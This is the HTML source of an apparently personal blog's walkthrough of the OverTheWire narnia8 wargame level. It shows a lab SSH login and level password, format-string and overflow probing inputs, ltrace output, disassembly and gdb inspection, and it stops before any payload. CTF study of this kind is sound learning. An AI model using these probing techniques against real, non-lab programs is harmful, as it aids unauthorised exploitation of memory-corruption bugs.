@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Narnia Challenges (part 6) - noopz</title><meta name="Description" content="The sixth and final in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit."><meta property="og:title" content="Narnia Challenges (part 6)" />
+<meta property="og:description" content="The sixth and final in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://noopz.github.io/narnia_challenges_part6/" />
+<meta property="og:image" content="https://noopz.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-08-08T08:26:53+00:00" />
+<meta property="article:modified_time" content="2020-08-02T22:03:52-07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Narnia Challenges (part 6)"/>
+<meta name="twitter:description" content="The sixth and final in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit."/>
+<meta name="application-name" content="noopz">
+<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/narnia_challenges_part6/" /><link rel="prev" href="https://noopz.github.io/narnia_challenges_part5/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Narnia Challenges (part 6)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/noopz.github.io\/narnia_challenges_part6\/"
+        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, narnia, wargames","wordcount":  3565 ,
+        "url": "https:\/\/noopz.github.io\/narnia_challenges_part6\/","datePublished": "2020-08-08T08:26:53+00:00","dateModified": "2020-08-02T22:03:52-07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "The sixth and final in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Narnia Challenges (part 6)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-08-08">2020-08-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3565 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;17 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#narnia8">narnia8</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>So it&rsquo;s been quite the adventure over the last few weeks going through the narnia challenges and it&rsquo;s finally time for the very last challenge. I&rsquo;ve seen quite a few different ways that folks have tackled this challenge, however I went for a slightly different solution. Instead of using an environment variable, we&rsquo;ll instead use a combination of <code>ltrace</code> and <code>gdb</code> to determine the location of the payload passed into the program.</p>
+<h2 id="narnia8">narnia8</h2>
+<p>How to log into Narnia:</p>
+<blockquote>
+<p>ssh -p 2226 <a href="mailto:narnia8@narnia.labs.overthewire.org">narnia8@narnia.labs.overthewire.org</a></p>
+</blockquote>
+<p>Password: <code>mohthuphog</code>
+Where to find all of the challenges:</p>
+<blockquote>
+<p>cd /narnia/</p>
+</blockquote>
+<p>And for the last time, try running the program to get an idea of what&rsquo;s going on - skipping straight to passing some more excessive input to try and make it crash.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34; * 1024&#39;`</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAA</span><span class="o">????????????</span>
+<span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34; * 2048&#39;`</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAA</span><span class="o">????????????</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>I wasn&rsquo;t able to get it to crash, but did see some sort of corruption. This is what <code>ltrace</code> shows:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">ltrace</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34; * 2048&#39;`</span>
+<span class="nf">__libc_start_main</span><span class="p">(</span><span class="mh">0x8048490</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="mh">0xffffcf84</span><span class="p">,</span> <span class="mh">0x80484d0</span> <span class="o">&lt;</span><span class="n">unfinished</span> <span class="kc">...</span><span class="o">&gt;</span>
+<span class="nf">memset</span><span class="p">(</span><span class="mh">0xffffcec4</span><span class="p">,</span> <span class="s">&#39;\0&#39;</span><span class="p">,</span> <span class="m">20</span><span class="p">)</span>                                         <span class="o">=</span> <span class="mh">0xffffcec4</span>
+<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s\n&#34;</span><span class="p">,</span> <span class="s">&#34;AAAAAAAAAAAAAAAAAAAAA\320\377\377\350\316\377\377\247\204\004\b&#34;</span><span class="n">...AAAAAAAAAAAAAAAAAAAAA</span><span class="o">???????????</span>
+<span class="p">)</span> <span class="o">=</span> <span class="m">37</span>
+<span class="o">+++</span> <span class="nf">exited </span><span class="p">(</span><span class="n">status</span> <span class="m">0</span><span class="p">)</span> <span class="o">+++</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Trying a small value of <code>A</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">ltrace</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34; * 64&#39;`</span>
+<span class="nf">__libc_start_main</span><span class="p">(</span><span class="mh">0x8048490</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="mh">0xffffd744</span><span class="p">,</span> <span class="mh">0x80484d0</span> <span class="o">&lt;</span><span class="n">unfinished</span> <span class="kc">...</span><span class="o">&gt;</span>
+<span class="nf">memset</span><span class="p">(</span><span class="mh">0xffffd684</span><span class="p">,</span> <span class="s">&#39;\0&#39;</span><span class="p">,</span> <span class="m">20</span><span class="p">)</span>                                         <span class="o">=</span> <span class="mh">0xffffd684</span>
+<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s\n&#34;</span><span class="p">,</span> <span class="s">&#34;AAAAAAAAAAAAAAAAAAAAA&#39;\377\377\250\326\377\377\247\204\004\b&#34;</span><span class="n">...AAAAAAAAAAAAAAAAAAAAA</span><span class="s">&#39;</span><span class="err">???????r???</span>
+<span class="p">)</span> <span class="o">=</span> <span class="m">37</span>
+<span class="o">+++</span> <span class="nf">exited </span><span class="p">(</span><span class="n">status</span> <span class="m">0</span><span class="p">)</span> <span class="o">+++</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>What about information leakage?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">ltrace</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;%x&#34; * 32&#39;`</span>
+<span class="nf">__libc_start_main</span><span class="p">(</span><span class="mh">0x8048490</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="mh">0xffffd744</span><span class="p">,</span> <span class="mh">0x80484d0</span> <span class="o">&lt;</span><span class="n">unfinished</span> <span class="kc">...</span><span class="o">&gt;</span>
+<span class="nf">memset</span><span class="p">(</span><span class="mh">0xffffd684</span><span class="p">,</span> <span class="s">&#39;\0&#39;</span><span class="p">,</span> <span class="m">20</span><span class="p">)</span>                                         <span class="o">=</span> <span class="mh">0xffffd684</span>
+<span class="o">---</span> <span class="nf">SIGSEGV </span><span class="p">(</span><span class="n">Segmentation</span> <span class="n">fault</span><span class="p">)</span> <span class="o">---</span>
+<span class="o">+++</span> <span class="n">killed</span> <span class="n">by</span> <span class="n">SIGSEGV</span> <span class="o">+++</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>A segfault. Interesting. Worth keeping in mind while looking through the assembly:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">-</span><span class="n">d</span> <span class="n">narnia8</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="bp">F</span><span class="s">&#34;\n&#34;</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s">&#34;\n\n&#34;</span> <span class="s">&#39;$1 ~ /main&gt;/&#39;</span>
+<span class="m">08048490</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span>
+ <span class="m">8048490</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="n">ebp</span>
+ <span class="m">8048491</span><span class="o">:</span> <span class="m">89</span> <span class="n">e5</span>                <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+ <span class="m">8048493</span><span class="o">:</span> <span class="m">83</span> <span class="m">7</span><span class="n">d</span> <span class="m">08</span> <span class="m">01</span>          <span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">x8]</span><span class="p">,</span><span class="mh">0x1</span>
+ <span class="m">8048497</span><span class="o">:</span> <span class="m">7</span><span class="n">e</span> <span class="m">13</span>                <span class="n">jle</span>    <span class="m">80484</span><span class="n">ac</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+0</span><span class="n">x1c</span><span class="o">&gt;</span>
+ <span class="m">8048499</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">xc]</span>
+ <span class="m">804849</span><span class="n">c</span><span class="o">:</span> <span class="m">83</span> <span class="n">c0</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">804849</span><span class="n">f</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">00</span>                <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">80484</span><span class="n">a1</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80484</span><span class="n">a2</span><span class="o">:</span> <span class="n">e8</span> <span class="m">74</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">804841</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">&gt;</span>
+ <span class="m">80484</span><span class="n">a7</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">80484</span><span class="n">aa</span><span class="o">:</span> <span class="n">eb</span> <span class="m">13</span>                <span class="n">jmp</span>    <span class="m">80484</span><span class="n">bf</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+0</span><span class="n">x2f</span><span class="o">&gt;</span>
+ <span class="m">80484</span><span class="n">ac</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">xc]</span>
+ <span class="m">80484</span><span class="n">af</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">00</span>                <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">80484</span><span class="n">b1</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80484</span><span class="n">b2</span><span class="o">:</span> <span class="m">68</span> <span class="m">54</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048554</span>
+ <span class="m">80484</span><span class="n">b7</span><span class="o">:</span> <span class="n">e8</span> <span class="m">24</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80482e0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80484</span><span class="n">bc</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+ <span class="m">80484</span><span class="n">bf</span><span class="o">:</span> <span class="n">b8</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+ <span class="m">80484</span><span class="n">c4</span><span class="o">:</span> <span class="n">c9</span>                   <span class="n">leave</span>  
+ <span class="m">80484</span><span class="n">c5</span><span class="o">:</span> <span class="n">c3</span>                   <span class="n">ret</span>
+ <span class="m">80484</span><span class="n">c6</span><span class="o">:</span> <span class="m">66</span> <span class="m">90</span>                <span class="n">xchg</span>   <span class="n">ax</span><span class="p">,</span><span class="n">ax</span>
+ <span class="m">80484</span><span class="n">c8</span><span class="o">:</span> <span class="m">66</span> <span class="m">90</span>                <span class="n">xchg</span>   <span class="n">ax</span><span class="p">,</span><span class="n">ax</span>
+ <span class="m">80484</span><span class="n">ca</span><span class="o">:</span> <span class="m">66</span> <span class="m">90</span>                <span class="n">xchg</span>   <span class="n">ax</span><span class="p">,</span><span class="n">ax</span>
+ <span class="m">80484</span><span class="n">cc</span><span class="o">:</span> <span class="m">66</span> <span class="m">90</span>                <span class="n">xchg</span>   <span class="n">ax</span><span class="p">,</span><span class="n">ax</span>
+ <span class="m">80484</span><span class="n">ce</span><span class="o">:</span> <span class="m">66</span> <span class="m">90</span>                <span class="n">xchg</span>   <span class="n">ax</span><span class="p">,</span><span class="n">ax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This is likely the print for the usage:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80484</span><span class="n">b2</span><span class="o">:</span> <span class="m">68</span> <span class="m">54</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048554</span>
+ <span class="m">80484</span><span class="n">b7</span><span class="o">:</span> <span class="n">e8</span> <span class="m">24</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80482e0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+<span class="c1"># Verify in GDB</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x8048554</span>
+<span class="mh">0x8048554</span><span class="o">:</span> <span class="s">&#34;%s argument\n&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So the <code>main</code> function isn&rsquo;t very interesting it just checks to see if the argument isn&rsquo;t null otherwise calls <code>func</code> with the argument from the command line. By now it&rsquo;s pretty obvious where <code>argv[0]</code> comes from and indexing into it to get the values passed in:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048499</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">xc</span><span class="nf">]
+</span><span class="nf">
+</span><span class="nf"></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">wx</span> <span class="o">$</span><span class="n">ebp</span><span class="m">+0</span><span class="n">xc</span>
+<span class="mh">0xffffd6c4</span><span class="o">:</span> <span class="mh">0xffffd754</span>
+
+ <span class="m">804849</span><span class="n">c</span><span class="o">:</span> <span class="m">83</span> <span class="n">c0</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
+
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">wx</span> <span class="mh">0xffffd758</span>
+<span class="mh">0xffffd758</span><span class="o">:</span> <span class="mh">0xffffd896</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0xffffd896</span>
+<span class="mh">0xffffd896</span><span class="o">:</span> <span class="s">&#34;AAAA&#34;</span>              <span class="c1"># And the value that was passed in.</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This moves the address of <code>argv[1]</code> into <code>$eax</code> so it can be passed at the first (and only) parameter of <code>func</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">804849</span><span class="n">f</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">00</span>                <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">80484</span><span class="n">a1</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80484</span><span class="n">a2</span><span class="o">:</span> <span class="n">e8</span> <span class="m">74</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">804841</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Time for a deeper look into <code>func</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">-</span><span class="n">d</span> <span class="n">narnia8</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="bp">F</span><span class="s">&#34;\n&#34;</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s">&#34;\n\n&#34;</span> <span class="s">&#39;$1 ~ /func&gt;/&#39;</span>
+<span class="m">0804841</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">&gt;:</span>
+ <span class="m">804841</span><span class="n">b</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="n">ebp</span>
+ <span class="m">804841</span><span class="n">c</span><span class="o">:</span> <span class="m">89</span> <span class="n">e5</span>                <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+ <span class="m">804841</span><span class="n">e</span><span class="o">:</span> <span class="m">83</span> <span class="n">ec</span> <span class="m">18</span>             <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x18</span>
+ <span class="m">8048421</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">08</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">x8]</span>
+ <span class="m">8048424</span><span class="o">:</span> <span class="m">89</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x4]</span><span class="p">,</span><span class="n">eax</span>
+ <span class="m">8048427</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">14</span>                <span class="n">push</span>   <span class="mh">0x14</span>
+ <span class="m">8048429</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">00</span>                <span class="n">push</span>   <span class="mh">0x0</span>
+ <span class="m">804842</span><span class="n">b</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">e8</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x18]</span>
+ <span class="m">804842</span><span class="n">e</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
